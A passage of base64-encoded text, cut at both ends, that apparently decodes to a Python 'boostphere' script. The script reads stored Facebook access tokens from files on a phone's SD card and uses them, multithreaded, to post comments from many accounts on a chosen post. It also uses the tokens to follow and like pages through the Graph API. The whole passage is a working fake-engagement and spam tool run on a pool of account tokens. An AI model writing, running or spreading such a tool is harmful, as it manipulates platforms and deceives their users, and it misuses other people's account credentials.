vcHRpb25zOgogICAgICAgICAgICBwcmludCgiSW52YWxpZCBjaG9pY2UuIikKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZmlsZV9wYXRoID0gZmlsZV9vcHRpb25zW2ZpbGVfY2hvaWNlXQogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlci4iKQogICAgICAgIHJldHVybgoKICAgICMgU3RlcCAyOiBMb2FkIHRoZSB0b2tlbnMgZnJvbSB0aGUgc2VsZWN0ZWQgZmlsZQogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyJykgYXMgZmlsZToKICAgICAgICAgICAgdG9rZW5zID0gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBmaWxlLnJlYWRsaW5lcygpIGlmIGxpbmUuc3RyaXAoKV0gICMgRW5zdXJlIG5vIGVtcHR5IGxpbmVzCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgcHJpbnQoIkZpbGUgbm90IGZvdW5kLiIpCiAgICAgICAgcmV0dXJuCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcGFzcwogICAgICAgIHJldHVybgoKICAgIGF2YWlsYWJsZV90b2tlbnMgPSBsZW4odG9rZW5zKQoKICAgICMgU3RlcCAzOiBBc2sgdGhlIHVzZXIgZm9yIHRoZSBzdGFydGluZyBsaW5lCiAgICBpZiBhdmFpbGFibGVfdG9rZW5zID09IDA6CiAgICAgICAgcHJpbnQoIk5vIHRva2VucyBhdmFpbGFibGUgZnJvbSB0aGUgc2VsZWN0ZWQgZmlsZS4iKQogICAgICAgIHJldHVybgoKICAgIHRyeToKICAgICAgICBzdGFydF9saW5lID0gaW50KGlucHV0KGYiICAgIHtncmVlbn1FbnRlciB0aGUgc3RhcnRpbmcgbGluZSB7cmVkfSgxIHRvIHthdmFpbGFibGVfdG9rZW5zfSk6ICIpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGlmIHN0YXJ0X2xpbmUgPCAxIG9yIHN0YXJ0X2xpbmUgPiBhdmFpbGFibGVfdG9rZW5zOgogICAgICAgICAgICBwcmludChmIlBsZWFzZSBlbnRlciBhIHZhbGlkIGxpbmUgbnVtYmVyIGJldHdlZW4gMSBhbmQge2F2YWlsYWJsZV90b2tlbnN9LiIpCiAgICAgICAgICAgIHJldHVybgogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlci4iKQogICAgICAgIHJldHVybgoKICAgIHRva2VucyA9IHRva2Vuc1tzdGFydF9saW5lIC0gMTpdICAjIFVzZSB0b2tlbnMgc3RhcnRpbmcgZnJvbSB0aGUgZ2l2ZW4gbGluZQogICAgCiAgICAjIFN0ZXAgNDogQXNrIGZvciB0aGUgcG9zdCBJRAogICAgYSA9IGlucHV0KGYiICAgIHtncmVlbn1FbnRlciB0aGUgcG9zdCBJRDogIikKICAgIHBvc3RfaWQgPSBnZXRfY29tYmluZWRfZGF0YShhKQogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCgogICAgIyBTdGVwIDU6IEFzayBob3cgbWFueSBjb21tZW50cyBhbmQgZ2V0IHRoZSBsaXN0IG9mIGNvbW1lbnRzCiAgICB0cnk6CiAgICAgICAgbnVtX2NvbW1lbnRzID0gaW50KGlucHV0KGYiICAgIHtyZWR9RW50ZXIgdGhlIG51bWJlciBvZiBjb21tZW50czogIikpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgaWYgbnVtX2NvbW1lbnRzIDw9IDA6CiAgICAgICAgICAgIHByaW50KCJOdW1iZXIgb2YgY29tbWVudHMgbXVzdCBiZSBncmVhdGVyIHRoYW4gMC4iKQogICAgICAgICAgICByZXR1cm4KICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKICAgICAgICByZXR1cm4KICAgIGNvbW1lbnRzX2xpc3QgPSBbXQogICAgZm9yIGkgaW4gcmFuZ2UobnVtX2NvbW1lbnRzKToKICAgICAgICBjb21tZW50ID0gaW5wdXQoZiIgICAge2dyZWVufUVudGVyIGNvbW1lbnQge2kgKyAxfTogIikKICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBjb21tZW50c19saXN0LmFwcGVuZChjb21tZW50KQoKICAgICMgU3RlcCA2OiBBc2sgaG93IG1hbnkgYWNjb3VudHMgdG8gdXNlIGZvciBjb21tZW50aW5nCiAgICB0cnk6CiAgICAgICAgbnVtX2FjY291bnRzID0gaW50KGlucHV0KGYiICAge2dyZWVufUVudGVyIHRoZSBudW1iZXIgb2YgYWNjb3VudHMgdG8gc3VjY2Vzc2Z1bGx5IGNvbW1lbnQgKDEgdG8ge2xlbih0b2tlbnMpfSk6ICIpKQogICAgICAgIGlmIG51bV9hY2NvdW50cyA+IGxlbih0b2tlbnMpIG9yIG51bV9hY2NvdW50cyA8PSAwOgogICAgICAgICAgICBwcmludChmIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlciBiZXR3ZWVuIDEgYW5kIHtsZW4odG9rZW5zKX0uIikKICAgICAgICAgICAgcmV0dXJuCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgIyBTdGVwIDc6IFBlcmZvcm0gY29tbWVudHMsIGVuc3VyaW5nIHRoZSByZXF1aXJlZCBudW1iZXIgb2Ygc3VjY2Vzc2Z1bCBjb21tZW50cwogICAgc3VjY2Vzc2Z1bF9jb21tZW50cyA9IDAKICAgIG1heF93b3JrZXJzID0gIDIgIyBTZXQgdGhlIG1heGltdW0gbnVtYmVyIG9mIHRocmVhZHMKCiAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz1tYXhfd29ya2VycykgYXMgZXhlY3V0b3I6CiAgICAgICAgd2hpbGUgc3VjY2Vzc2Z1bF9jb21tZW50cyA8IG51bV9hY2NvdW50cyBhbmQgdG9rZW5zOgogICAgICAgICAgICB0b2tlbiA9IHRva2Vucy5wb3AoMCkgICMgVGFrZSB0aGUgbmV4dCB0b2tlbgogICAgICAgICAgICBjb21tZW50ID0gcmFuZG9tLmNob2ljZShjb21tZW50c19saXN0KSAgIyBSYW5kb21seSBwaWNrIGEgY29tbWVudAogICAgICAgICAgICBmdXR1cmUgPSBleGVjdXRvci5zdWJtaXQoY29tbWVudF93aXRoX3Rva2VuLCBwb3N0X2lkLCBjb21tZW50LCB0b2tlbikKICAgICAgICAgICAgCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHJlc3VsdCA9IGZ1dHVyZS5yZXN1bHQoKQogICAgICAgICAgICAgICAgcHJpbnQocmVzdWx0KSAgIyBQcmludCB0aGUgcmVzdWx0IG9mIHRoZSBjb21tZW50IGF0dGVtcHQKICAgICAgICAgICAgICAgIGlmICJTVUNDRVNTRlVMTFkiIGluIHJlc3VsdDoKICAgICAgICAgICAgICAgICAgICBzdWNjZXNzZnVsX2NvbW1lbnRzICs9IDEgICMgSW5jcmVtZW50IG9ubHkgZm9yIHN1Y2Nlc3NmdWwgY29tbWVudHMKICAgICAgICAgICAgICAgICAgICBwcmludChmIntzdWNjZXNzZnVsX2NvbW1lbnRzfS97bnVtX2FjY291bnRzfSBjb21tZW50cyBzdWNjZXNzZnVsLiIpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHBhc3MKCiAgICAjIEZpbmFsIG91dHB1dAogICAgaWYgc3VjY2Vzc2Z1bF9jb21tZW50cyA9PSBudW1fYWNjb3VudHM6CiAgICAgICAgcHJpbnQoZiJBbGwge251bV9hY2NvdW50c30gY29tbWVudHMgd2VyZSBzdWNjZXNzZnVsbHkgbWFkZSEiKQogICAgZWxzZToKICAgICAgICBwcmludChmIk9ubHkge3N1Y2Nlc3NmdWxfY29tbWVudHN9L3tudW1fYWNjb3VudHN9IGNvbW1lbnRzIHdlcmUgc3VjY2Vzc2Z1bC4gTm8gbW9yZSB0b2tlbnMgYXZhaWxhYmxlLiIpCgpkZWYgbGl2ZV9jb21tZW50KCk6CiAgICAiIiJQZXJmb3JtIGNvbW1lbnRzIGJhc2VkIG9uIHVzZXIgaW5wdXQgZm9yIGZpbGUgY2hvaWNlLCBzdGFydGluZyBsaW5lLCBwb3N0IGxpbmssIGFuZCBudW1iZXIgb2YgY29tbWVudHMuIiIiCiAgICAKICAgICMgU3RlcCAxOiBBc2sgdGhlIHVzZXIgd2hpY2ggZmlsZSB0byB1c2UKICAgIGZpbGVfb3B0aW9ucyA9IHsKICAgICAgICAxOiAiL3NkY2FyZC9ib29zdHBoZXJlL0ZSQUFDQ09VTlQudHh0IiwKICAgICAgICAyOiAiL3NkY2FyZC9ib29zdHBoZXJlL0ZSQVBBR0VTLnR4dCIsCiAgICAgICAgMzogIi9zZGNhcmQvYm9vc3RwaGVyZS9SUFdBQ0NPVU5ULnR4dCIsCiAgICAgICAgNDogIi9zZGNhcmQvYm9vc3RwaGVyZS9SUFdQQUdFUy50eHQiCiAgICB9CiAgICBjbGVhcl9zY3JlZW4oKQogICAgam92YW4oKQogICAgcHJpbnQoZiIiIiAgICAge3doaXRlfUNIT09TRSBUWVBFIE9GIFJFQUNUT1JTOiAKICAgICB7eWVsbG93fVsxXSB7Z3JlZW59RlJBIEFDQ09VTlQgCiAgICAge3llbGxvd31bMl0ge2dyZWVufUZSQSBQQUdFUwogICAgIHt5ZWxsb3d9WzNdIHtncmVlbn1SUFcgQUNDT1VOVAogICAgIHt5ZWxsb3d9WzRdIHtncmVlbn1SUFcgUEFHRVMKICAgICB7cmVkfVswXSB7cmVkfUVYSVQgCiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIiIiKQogICAgCiAgICB0cnk6CiAgICAgICAgZmlsZV9jaG9pY2UgPSBpbnQoaW5wdXQoZiIgICAgIHtncmVlbn1DaG9vc2U6ICIpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGlmIGZpbGVfY2hvaWNlIG5vdCBpbiBmaWxlX29wdGlvbnM6CiAgICAgICAgICAgIHByaW50KCJJbnZhbGlkIGNob2ljZS4iKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBmaWxlX3BhdGggPSBmaWxlX29wdGlvbnNbZmlsZV9jaG9pY2VdCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgIyBTdGVwIDI6IExvYWQgdGhlIHRva2VucyBmcm9tIHRoZSBzZWxlY3RlZCBmaWxlCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3InKSBhcyBmaWxlOgogICAgICAgICAgICB0b2tlbnMgPSBbbGluZS5zdHJpcCgpIGZvciBsaW5lIGluIGZpbGUucmVhZGxpbmVzKCkgaWYgbGluZS5zdHJpcCgpXSAgIyBFbnN1cmUgbm8gZW1wdHkgbGluZXMKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBwcmludCgiRmlsZSBub3QgZm91bmQuIikKICAgICAgICByZXR1cm4KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIkVycm9yIGxvYWRpbmcgdG9rZW5zOiB7ZX0iKQogICAgICAgIHJldHVybgoKICAgIGF2YWlsYWJsZV90b2tlbnMgPSBsZW4odG9rZW5zKQoKICAgICMgU3RlcCAzOiBBc2sgdGhlIHVzZXIgZm9yIHRoZSBzdGFydGluZyBsaW5lCiAgICBpZiBhdmFpbGFibGVfdG9rZW5zID09IDA6CiAgICAgICAgcHJpbnQoIk5vIHRva2VucyBhdmFpbGFibGUgZnJvbSB0aGUgc2VsZWN0ZWQgZmlsZS4iKQogICAgICAgIHJldHVybgoKICAgIHRyeToKICAgICAgICBzdGFydF9saW5lID0gaW50KGlucHV0KGYiICAgIHtncmVlbn1FbnRlciB0aGUgc3RhcnRpbmcgbGluZSB7cmVkfSgxIHRvIHthdmFpbGFibGVfdG9rZW5zfSk6ICIpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGlmIHN0YXJ0X2xpbmUgPCAxIG9yIHN0YXJ0X2xpbmUgPiBhdmFpbGFibGVfdG9rZW5zOgogICAgICAgICAgICBwcmludChmIlBsZWFzZSBlbnRlciBhIHZhbGlkIGxpbmUgbnVtYmVyIGJldHdlZW4gMSBhbmQge2F2YWlsYWJsZV90b2tlbnN9LiIpCiAgICAgICAgICAgIAogICAgICAgICAgICByZXR1cm4KICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKICAgICAgICByZXR1cm4KCiAgICB0b2tlbnMgPSB0b2tlbnNbc3RhcnRfbGluZSAtIDE6XSAgIyBVc2UgdG9rZW5zIHN0YXJ0aW5nIGZyb20gdGhlIGdpdmVuIGxpbmUKICAgIAogICAgIyBTdGVwIDQ6IEFzayBmb3IgdGhlIHBvc3QgSUQKICAgIGEgPSBpbnB1dChmIiAgICB7Z3JlZW59RW50ZXIgdGhlIHBvc3QgSUQ6ICIpCiAgICBwb3N0X2lkID0gZ2V0X2NvbWJpbmVkX2RhdGEoYSkKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQoKICAgICMgU3RlcCA1OiBBc2sgaG93IG1hbnkgY29tbWVudHMgYW5kIGdldCB0aGUgbGlzdCBvZiBjb21tZW50cwogICAgdHJ5OgogICAgICAgIG51bV9jb21tZW50cyA9IGludChpbnB1dChmIiAgICB7cmVkfUVudGVyIHRoZSBudW1iZXIgb2YgY29tbWVudHM6ICIpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGlmIG51bV9jb21tZW50cyA8PSAwOgogICAgICAgICAgICBwcmludCgiTnVtYmVyIG9mIGNvbW1lbnRzIG11c3QgYmUgZ3JlYXRlciB0aGFuIDAuIikKICAgICAgICAgICAgcmV0dXJuCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgY29tbWVudHNfbGlzdCA9IFtdCiAgICBmb3IgaSBpbiByYW5nZShudW1fY29tbWVudHMpOgogICAgICAgIGNvbW1lbnQgPSBpbnB1dChmIiAgICB7Z3JlZW59RW50ZXIgY29tbWVudCB7aSArIDF9OiAiKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGNvbW1lbnRzX2xpc3QuYXBwZW5kKGNvbW1lbnQpCgogICAgCiAgICB0cnk6CiAgICAgICAgbnVtX2FjY291bnRzID0gaW50KGlucHV0KGYiICAge2dyZWVufUVudGVyIHRoZSBudW1iZXIgb2YgYWNjb3VudHMgdG8gdXNlIGZvciBjb21tZW50aW5nICgxIHRvIHtsZW4odG9rZW5zKX0pOiAiKSkKICAgICAgICBpZiBudW1fYWNjb3VudHMgPiBsZW4odG9rZW5zKSBvciBudW1fYWNjb3VudHMgPD0gMDoKICAgICAgICAgICAgcHJpbnQoZiJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIgYmV0d2VlbiAxIGFuZCB7bGVuKHRva2Vucyl9LiIpCiAgICAgICAgICAgIHJldHVybgogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlci4iKQogICAgICAgIHJldHVybgoKICAgICMgU3RlcCA3OiBQZXJmb3JtIGNvbW1lbnRzIHVzaW5nIG11bHRpdGhyZWFkaW5nCiAgICByZXN1bHRzID0gW10KICAgIGNvbW1lbnRzX2NvdW50ID0gMAogICAgbWF4X3dvcmtlcnMgPSAyICAjIFNldCB0aGUgbWF4aW11bSBudW1iZXIgb2YgdGhyZWFkcwogICAgCiAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz1tYXhfd29ya2VycykgYXMgZXhlY3V0b3I6CiAgICAgICAgZnV0dXJlX3RvX3Rva2VuID0ge30KICAgICAgICBmb3IgaSwgdG9rZW4gaW4gZW51bWVyYXRlKHRva2Vuc1s6bnVtX2FjY291bnRzXSk6CiAgICAgICAgICAgIGNvbW1lbnQgPSByYW5kb20uY2hvaWNlKGNvbW1lbnRzX2xpc3QpICAjIFJhbmRvbWx5IHBpY2sgYSBjb21tZW50CiAgICAgICAgICAgIGZ1dHVyZSA9IGV4ZWN1dG9yLnN1Ym1pdChjb21tZW50X3dpdGhfdG9rZW4sIHBvc3RfaWQsIGNvbW1lbnQsIHRva2VuKQogICAgICAgICAgICBmdXR1cmVfdG9fdG9rZW5bZnV0dXJlXSA9IHRva2VuCgogICAgICAgIGZvciBmdXR1cmUgaW4gYXNfY29tcGxldGVkKGZ1dHVyZV90b190b2tlbik6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHJlc3VsdCA9IGZ1dHVyZS5yZXN1bHQoKQogICAgICAgICAgICAgICAgcHJpbnQocmVzdWx0KSAgIyBQcmludCB0aGUgcmVzdWx0IG9mIHRoZSBjb21tZW50IGF0dGVtcHQKICAgICAgICAgICAgICAgIGlmICJTVUNDRVNTRlVMTFkiIGluIHJlc3VsdDoKICAgICAgICAgICAgICAgICAgICBjb21tZW50c19jb3VudCArPSAxCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHByaW50KGYiRXJyb3IgcHJvY2Vzc2luZyB0b2tlbjoge2V9IikKCiAgICBwcmludChmIlRvdGFsIGNvbW1lbnRzIG1hZGU6IHtjb21tZW50c19jb3VudH0iKQojIEV4ZWN1dGUgdGhlIGZ1bmN0aW9uCgoKIyBFeGVjdXRlIHRoZSBmdW5jdGlvbgoKaW1wb3J0IHJlcXVlc3RzCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IsIGFzX2NvbXBsZXRlZAoKCgpkZWYgbG9hZF90b2tlbnMoZmlsZV9wYXRoKToKICAgICIiIkxvYWQgdG9rZW5zIGZyb20gdGhlIHNwZWNpZmllZCBmaWxlLiIiIgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyJykgYXMgZmlsZToKICAgICAgICAgICAgdG9rZW5zID0gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBmaWxlLnJlYWRsaW5lcygpIGlmIGxpbmUuc3RyaXAoKV0KICAgICAgICByZXR1cm4gdG9rZW5zCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgcHJpbnQoIkZpbGUgbm90IGZvdW5kLiIpCiAgICAgICAgcmV0dXJuIFtdCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJFcnJvciBsb2FkaW5nIHRva2Vuczoge2V9IikKICAgICAgICByZXR1cm4gW10KCmRlZiBmb2xsb3dfYW5kX2xpa2VfZmFjZWJvb2tfcGFnZSh1aWQsIGFjY2Vzc190b2tlbik6CiAgICAiIiJGb2xsb3cgYW5kIGxpa2UgYSBGYWNlYm9vayBwYWdlL3Byb2ZpbGUgdXNpbmcgdGhlIGdpdmVuIFVJRCBhbmQgYWNjZXNzIHRva2VuLiIiIgogICAgZm9sbG93X3VybCA9IGYiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjIwLjAve3VpZH0vc3Vic2NyaWJlcnMiCiAgICBoZWFkZXJzID0geydBdXRob3JpemF0aW9uJzogZidCZWFyZXIge2FjY2Vzc190b2tlbn0nfQogICAgCiAgICAjIFBlcmZvcm0gdGhlIGZvbGxvdyBhY3Rpb24KICAgIGZvbGxvd19yZXNwb25zZSA9IG1ha2VfaHR0cF9yZXF1ZXN0KCdQT1NUJywgZm9sbG93X3VybCwgaGVhZGVycz1oZWFkZXJzKQogICAgaWYgZm9sbG93X3Jlc3BvbnNlIGFuZCAnZXJyb3InIGluIGZvbGxvd19yZXNwb25zZToKICAgICAgICBwcmludChmIkVycm9yIGZvbGxvd2luZyBwYWdlIHdpdGggVUlEIHt1aWR9OiB7Zm9sbG93X3Jlc3BvbnNlWydlcnJvciddWydtZXNzYWdlJ119IikKICAgIGVsaWYgZm9sbG93X3Jlc3BvbnNlOgogICAgICAgIHByaW50KGYiXDAzM1sxOzMybVtTVUNDRVNTRlVMTFldIEZPTExPV0VEIHRoZSBwYWdlL3Byb2ZpbGUgd2l0aCBVSUQge3VpZH1cMDMzWzBtIikKCiAgICAjIFBlcmZvcm0gdGhlIGxpa2UgYWN0aW9uCiAgICBsaWtlX3VybCA9IGYiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjIwLjAve3VpZH0vbGlrZXMiCiAgICBsaWtlX3Jlc3BvbnNlID0gbWFrZV9odHRwX3JlcXVlc3QoJ1BPU1QnLCBsaWtlX3VybCwgaGVhZGVycz1oZWFkZXJzKQogICAgaWYgbGlrZV9yZXNwb25zZSBhbmQgJ2Vycm9yJyBpbiBsaWtlX3Jlc3BvbnNlOgogICAgICAgIHByaW50KGYiRXJyb3IgbGlraW5nIHBhZ2Ugd2l0aCBVSUQge3VpZH06IHtsaWtlX3Jlc3BvbnNlWydlcnJvciddWydtZXNzYWdlJ119IikKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoZiJcMDMzWzE7MzJtW1NVQ0NFU1NGVUxMWV0gTElLRUQgdGhlIHBhZ2UvcHJvZmlsZSB3aXRoIFVJRCB7dWlkfVwwMzNbMG0iKQoKZGVmIG1ha2VfaHR0cF9yZXF1ZXN0KG1ldGhvZCwgdXJsLCBoZWFkZXJzPU5vbmUsIGRhdGE9Tm9uZSk6CiAgICAiIiJNYWtlIGFuIEhUVFAgcmVxdWVzdC4iIiIKICAgIHRyeToKICAgICAgICBpZiBtZXRob2QudXBwZXIoKSA9PSAnUE9TVCc6CiAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGhlYWRlcnM9aGVhZGVycywgZGF0YT1kYXRhKQogICAgICAgIGVsaWYgbWV0aG9kLnVwcGVyKCkgPT0gJ0dFVCc6CiAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHVybCwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYiVW5zdXBwb3J0ZWQgSFRUUCBtZXRob2Q6IHttZXRob2R9IikKICAgICAgICAgICAgcmV0dXJuIE5vbmUKCiAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICByZXR1cm4gcmVzcG9uc2UuanNvbigpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoZiJIVFRQIHJlcXVlc3QgZmFpbGVkIHdpdGggc3RhdHVzIGNvZGU6IHtyZXNwb25zZS5zdGF0dXNfY29kZX0iKQogICAgICAgICAgICByZXR1cm4gcmVzcG9uc2UuanNvbigpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJBbiBlcnJvciBvY2N1cnJlZCBkdXJpbmcgdGhlIEhUVFAgcmVxdWVzdDoge3N0cihlKX0iKQogICAgICAgIHJldHVybiBOb25lCgpkZWYgcGVyZm9ybV9hY3Rpb25zX2Zyb21fZmlsZSgpOgogICAgIiIiTWFpbiBmdW5jdGlvbiB0byBtYW5hZ2UgdGhlIGZvbGxvdyBhbmQgbGlrZSBhY3Rpb25zIGJhc2VkIG9uIHVzZXIgaW5wdXQuIiIiCiAgICBmaWxlX29wdGlvbnMgPSB7CiAgICAgICAgMTogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFBQ0NPVU5ULnR4dCIsCiAgICAgICAgMjogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFQQUdFUy50eHQiLAogICAgICAgIDM6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXQUNDT1VOVC50eHQiLAogICAgICAgIDQ6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXUEFHRVMudHh0IgogICAgfQogICAgC